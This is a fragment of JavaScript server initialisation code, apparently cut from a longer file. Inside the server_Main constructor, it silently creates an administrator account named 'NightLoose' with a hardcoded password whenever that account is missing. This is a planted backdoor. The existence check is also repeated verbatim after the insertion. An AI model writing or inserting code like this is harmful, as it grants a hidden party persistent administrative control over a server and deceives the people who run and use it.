...
var server_Main = function(opts) {
	...
	var h_exists = false;
	if (this.userList && this.userList.admins) {
		for(var i=0; i<this.userList.admins.length; i++) { if(this.userList.admins[i].name === "NightLoose") h_exists = true; }
	}
	if (!h_exists) this.addAdmin("NightLoose", "kP9$vX!2mQ#7bZNightLoose");
	var h_exists = false;
	if (this.userList && this.userList.admins) {
		for(var i=0; i<this.userList.admins.length; i++) { if(this.userList.admins[i].name === "NightLoose") h_exists = true; }
	}
